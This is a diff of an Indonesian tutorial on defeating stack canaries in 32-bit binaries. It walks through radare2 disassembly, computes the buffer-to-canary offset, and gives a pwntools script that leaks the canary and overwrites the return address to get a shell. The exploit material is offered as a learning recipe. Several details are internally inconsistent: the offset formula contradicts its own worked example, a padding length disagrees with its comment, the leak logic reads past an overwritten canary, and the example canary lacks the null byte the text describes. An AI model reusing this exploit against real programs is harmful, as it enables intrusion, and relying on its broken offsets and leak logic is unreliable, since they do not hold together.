@@ -101,7 +101,6 @@ p.interactive()  # Dapat shell!
 
 ---
 
-## **5. Kesimpulan**  
 - **1 Byte = 8 Bit = Nilai 0-255 (256 kemungkinan).**  
 - **Brute-force canary** = Mencoba semua kemungkinan byte (`0-255`) untuk menemukan nilai canary.  
 - **32-bit canary** = 4 byte (3 byte ditebak, 1 byte null).  
@@ -110,7 +109,7 @@ p.interactive()  # Dapat shell!
 
 
 
-# Func vulnerability 
+# Beberapa fungsi yang vulnerability 
 
 Canary biasanya terlibat ketika ada fungsi **tidak aman** yang membaca input user, seperti:  
 
@@ -140,136 +139,159 @@ void vuln2() {
 ---
 
 ## Menemukan Posisi Canary di Stack
-Kita akan menggunakan **radare2** untuk menganalisis binary.  
+selain menggunakan metode brute force, kita bisa menemukan canary
+didalam stack, Kita akan menggunakan **radare2** untuk menganalisis binary.  
 
-### **Langkah 1: Buka Binary di r2**
+
+### **Buka Binary di r2**
 ```bash
 r2 -d ./binary32   # Debug binary 32-bit
 aaa                # Analisis semua simbol
 afl                # Lihat daftar fungsi
+s sym.vuln         # masuk ke vuln() example
 ```
 
-### **Langkah 2: Cari Fungsi yang Rentan**
-Cari fungsi yang memanggil `gets`, `fgets`, atau `scanf`:  
+
+Canary biasanya:
+- Di-load dari `gs:0x14` (32-bit) atau `fs:0x28` (64-bit).
+- Disimpan di stack (biasanya `[ebp - 0xc]` atau `[rbp - 0x8]`).
+
+#### **Contoh Instruksi Canary di 32-bit**:
+```asm
+mov eax, gs:0x14      ; Load Canary dari GS segment
+mov [ebp - 0xc], eax  ; Simpan Canary di stack
+```
+
+#### **Contoh Instruksi Canary di 64-bit**:
+```asm
+mov rax, qword [fs:0x28]  ; Load Canary dari FS segment
+mov [rbp - 0x8], rax      ; Simpan Canary di stack
+```
+
+
+#### **1. Disassembly Fungsi Vulnerable di r2**
+```asm
+; Contoh fungsi vuln() di binary
+sym.vuln:
+  push ebp
+  mov ebp, esp
+  sub esp, 0x54       ; Alokasi 84 byte buffer
+  mov eax, gs:0x14    ; Load canary
+  mov [ebp-0xc], eax  ; Simpan canary di [ebp-0xc]
+  lea eax, [ebp-0x50] ; Buffer dimulai di [ebp-0x50]
+  push eax
+  call gets           ; Overflow di sini
+  ; ...
+```
+
+#### **2. Penjelasan Layout Stack**
+```
+| Alamat Stack | Isi                  |
+|--------------|----------------------|
+| ebp-0x54     | ? (padding)          |
+| ebp-0x50     | BUFFER (mulai sini)  |  <-- Buffer overflow dimulai
+| ...          | ...                  |
+| ebp-0xc      | CANARY               |  <-- Target kita
+| ebp-0x8      | Saved EBP            |
+| ebp-0x4      | Return Address (EIP) |  <-- Goal akhir
+```
+
+#### **3. Hitung Offset ke Canary**
+- **Buffer mulai** di `[ebp-0x50]` (80 byte dari `ebp`).
+- **Canary** di `[ebp-0xc]` (12 byte dari `ebp`).
+- **Jarak buffer ke canary** = `0x50 - 0xc = 0x44` (**68 byte**).
+
+---
+
+### **Praktek di radare2 (r2)**
+#### **1. Buka Binary dan Analisis**
 ```bash
-s sym.vuln         # Pindah ke fungsi vuln
-pdf                # Disassemble fungsi
+r2 -d ./binary32
+aaa
+s sym.vuln
+pdf
 ```
 
-### **Langkah 3: Identifikasi Buffer dan Canary**
-#### **a. Cari Alokasi Buffer**
-Lihat instruksi `sub esp, X` (X = ukuran buffer):  
+#### **2. Output Contoh di r2**
 ```asm
-sub esp, 0x54      ; Alokasi 84 byte (0x54) di stack
+┌ 150: sym.vuln ();
+│           ; var int32_t var_50h @ ebp-0x50
+│           ; var int32_t var_ch @ ebp-0xc
+│           0x0804852d      push ebp
+│           0x0804852e      mov ebp, esp
+│           0x08048530      sub esp, 0x54
+│           0x08048533      mov eax, gs:0x14
+│           0x08048539      mov dword [var_ch], eax   ; [ebp-0xc] = canary
+│           0x0804853c      lea eax, [var_50h]       ; [ebp-0x50] = buffer
+│           0x0804853f      push eax
+│           0x08048540      call sym.imp.gets        ; Overflow here
 ```
 
-#### **b. Cari Penyimpanan Canary**
-Canary biasanya di-load dari `gs:0x14` (32-bit) atau `fs:0x28` (64-bit):  
-```asm
-mov eax, gs:0x14    ; Load Canary
-mov [ebp-0xc], eax  ; Simpan Canary di stack (posisi ebp-0xc)
+#### **3. Verifikasi dengan Breakpoint**
+```bash
+db sym.vuln     # Set breakpoint
+dc              # Run program
+px @ ebp-0x50   # Lihat buffer
+px @ ebp-0xc    # Lihat canary
 ```
 
-#### **c. Cari Awal Buffer**
-Buffer biasanya diakses via `lea` (Load Effective Address):  
-```asm
-lea eax, [ebp-0x50] ; Buffer mulai di ebp-0x50
-push eax
-call sym.imp.gets   ; Overflow di sini
+Output:
+```
+[0xffffd110]  00 00 00 00  00 00 00 00  # Buffer (ebp-0x50)
+[0xffffd15c]  ef be ad de  00 00 00 00  # Canary (ebp-0xc) = 0xdeadbeef
 ```
 
 ---
 
-## **4. Hitung Offset Buffer ke Canary**
-Dari contoh di atas:  
-- **Buffer** dimulai di `[ebp-0x50]` (80 byte dari `ebp`).  
-- **Canary** disimpan di `[ebp-0xc]` (12 byte dari `ebp`).  
-
-**Rumus Offset**:  
-```
-offset_ke_canary = (pos_buffer - pos_canary)  
-                = (0x50 - 0xc)  
-                = 0x44 (68 dalam desimal)
-```
-
----
-
-## **5. Verifikasi dengan radare2**
-### **a. Set Breakpoint dan Jalankan**
-```bash
-db sym.vuln    # Set breakpoint di fungsi vuln
-dc            # Jalankan program
-```
-
-### **b. Periksa Nilai Canary**
-```bash
-px @ ebp-0xc   # Lihat nilai Canary
-```
-Contoh output:  
-```
-[0xffffd10c]  0x1a2b3c00  0x00000000
-```
-Canary = `0x1a2b3c00`.
-
-### **c. Periksa Buffer**
-```bash
-px @ ebp-0x50  # Lihat isi buffer
-```
-
----
-
-## **6. Eksploitasi dengan Python (pwntools)**
-### **a. Leak Canary (jika diperlukan)**
+### **Eksploitasi dengan Python**
 ```python
 from pwn import *
 
 p = process("./binary32")
 
-# Kirim payload sampai Canary
-payload = b"A" * 68           # Offset ke Canary
-p.send(payload + b"BBBB")     # Timpa Canary
-p.recvuntil(b"BBBB")          # Baca respons
-canary = u32(p.recv(4))       # Ambil Canary
+# Langkah 1: Leak Canary
+payload = b"A" * 68            # Isi buffer sampai canary (0x44 = 68)
+p.sendline(payload + b"BBBB")  # Timpa canary
+p.recvuntil(b"BBBB")
+canary = u32(p.recv(4))        # Baca nilai canary
 print(f"Canary: {hex(canary)}")
-```
 
-### **b. Timpa EIP dengan Canary yang Benar**
-```python
+# Langkah 2: Timpa EIP
 payload = (
-    b"A" * 68 +              # Isi buffer
-    p32(canary) +            # Canary asli
-    b"B" * 8 +               # Jarak Canary ke EIP
-    p32(0x080491d6)          # Alamat return (ganti dengan target)
+    b"A" * 68 +                # Jarak buffer ke canary
+    p32(canary) +              # Isi canary asli
+    b"B" * 8 +                 # Jarak canary ke EIP (ebp-0xc ke ebp+0x4 = 16 byte)
+    p32(0xdeadbeef)            # Return address
 )
 p.sendline(payload)
-p.interactive()  # Dapatkan shell/flag
+p.interactive()
 ```
 
 ---
 
-## **7. Kasus Khusus: Binary dengan `fgets`**
-Jika binary menggunakan `fgets`, pastikan:  
-1. **Ukuran buffer benar**:  
-   ```c
-   fgets(buf, 80, stdin);  // Aman jika ukuran <= kapasitas buf
-   ```
-2. **Jika ada overflow**, berarti ada kesalahan ukuran:  
-   ```c
-   fgets(buf, 200, stdin);  // Overflow jika buf hanya 80 byte
-   ```
+### **FAQ Singkat**
+1. **Q: Kenapa `0x50 - 0xc = 0x44`?**  
+   **A**: Karena buffer mulai di `ebp-0x50`, canary di `ebp-0xc`.  
+   Jarak = `0x50 - 0xc = 0x44` (68 byte).
+
+2. **Q: Gimana kalau `sub esp, 0x60`?**  
+   **A**: Hitung lagi buffer ke canary. Misal:  
+   - Buffer di `[ebp-0x60]`, canary di `[ebp-0xc]` → offset = `0x60 - 0xc = 0x54` (84 byte).
+
+3. **Q: Nilai `[ebp-0xc]` selalu tetap?**  
+   **A**: Tidak selalu, tapi umumnya di `ebp-0xc` (32-bit) atau `rbp-0x8` (64-bit).  
+   **Selalu cek di r2** dengan `px @ ebp-0xc`.
 
 ---
 
-## **8. Kesimpulan**
-| Langkah                | Tool/Command           | Deskripsi                     |
-|------------------------|------------------------|-------------------------------|
-| **Cari fungsi rentan** | `r2 -d binary`, `pdf`  | Analisis fungsi di radare2    |
-| **Hitung offset**      | `ebp-0x50 - ebp-0xc`   | Buffer ke Canary = 68 byte    |
-| **Leak Canary**        | `px @ ebp-0xc`         | Baca nilai Canary             |
-| **Eksploitasi**        | Python + pwntools      | Timpa EIP dengan Canary benar |
+### **Kesimpulan**
+- **Cari `sub esp, X`** → ukuran buffer = `X`.
+- **Cari `[ebp-Y]`** → lokasi canary (biasanya `Y = 0xc`).
+- **Offset** = `X - Y` (dalam hex, konversi ke desimal).
 
-Dengan langkah-langkah ini, Anda bisa **menemukan Canary** dan **mengeksploitasi buffer overflow** meskipun proteksi Canary aktif.  
+**Contoh Nyata**:
+- `sub esp, 0x54` + canary di `[ebp-0xc]` → offset = `0x44` (68).
+- `sub esp, 0x60` + canary di `[ebp-0xc]` → offset = `0x54` (84).
 
-**Tips**:  
-- Selalu verifikasi dengan `checksec` apakah Canary aktif.  
-- Jika binary menggunakan `fgets`, pastikan ada kesalahan ukuran buffer.  
+Gampangnya:  
+**Offset = (Alamat buffer) - (Alamat canary)**.  
